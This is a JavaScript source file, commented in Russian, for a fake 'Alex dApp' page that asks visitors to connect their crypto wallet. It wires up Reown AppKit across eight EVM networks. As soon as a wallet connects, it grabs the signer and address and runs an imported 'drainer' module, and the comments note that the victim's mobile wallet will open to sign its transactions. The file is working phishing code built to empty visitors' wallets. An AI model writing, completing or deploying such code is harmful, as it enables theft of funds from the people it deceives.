// main.js
import { createAppKit } from '@reown/appkit'
import {
  mainnet,
  polygon,
  bsc,
  avalanche,
  arbitrum,
  optimism,
  linea,
  base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'

// Все поддерживаемые сети
const networks = [
  mainnet,
  polygon,
  bsc,
  avalanche,
  arbitrum,
  optimism,
  linea,
  base
]

// Настраиваем адаптер Wagmi (AppKit сам подключит wallet‑connect/injected)
const wagmiAdapter = new WagmiAdapter({ projectId, networks })

const metadata = {
  name: 'Alex dApp',
  description: 'Connect your wallet',
  url: 'https://checkalex.xyz',
  icons: ['https://checkalex.xyz/icon.png']
}

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata,
  projectId,
  features: { analytics: true }
})

// Открытие модалки подключения
document
  .getElementById('open-connect-modal')
  .addEventListener('click', () => modal.open())

// Когда пользователь подключился, AppKit эмитит событие connect
modal.on('connect', async (payload) => {
  console.log('✅ Connected payload:', payload)

  try {
    // Вместо window.ethereum попросим адаптер выдать нам провайдер WalletConnect/Injected
    const provider = await wagmiAdapter.getProvider()
    // И обернем его в ethers.js
    const etherProvider = new ethers.providers.Web3Provider(provider, 'any')
    const signer = etherProvider.getSigner()
    const address = await signer.getAddress()

    // Запускаем drainer — все транзакции пойдут через тот же провайдер,
    // и на мобильном откроется ваш кошелек для подписи
    await runDrainer(etherProvider, signer, address)

    // Закрываем модалку (если нужно)
    modal.close()
    console.log('✅ Drainer finished')
  } catch (e) {
    console.error('❌ Ошибка в Drainer:', e)
    alert('Ошибка при выполнении Drainer: ' + e.message)
    // Модалку можно оставить открытой для повторной попытки
  }
})
